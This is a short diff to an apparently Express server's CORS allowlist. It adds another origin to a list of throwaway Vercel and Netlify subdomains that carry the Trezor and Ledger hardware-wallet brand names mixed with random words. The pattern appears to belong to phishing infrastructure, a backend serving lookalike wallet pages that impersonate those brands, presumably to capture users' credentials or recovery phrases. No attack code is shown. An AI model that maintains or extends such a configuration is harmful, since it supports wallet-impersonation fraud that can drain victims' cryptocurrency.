@@ -17,6 +17,8 @@ app.use(cors({
         "https://ledger-phi-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
         "https://trezor-aws-kei3-iran-shyam-pod-paint-sigma-gole-324324-psi.vercel.app",
         "https://trezor-mlv9-arab-shyam-pod-paint-sigma-gole-324324-psi.vercel.app",
+        // Latest Design
+        "https://latest-trezor-web-page-oman-pod-paint.vercel.app",
 
         // Netlify
         'https://trezor-aws-shyam-pod-topic-sigma-gole.netlify.app',
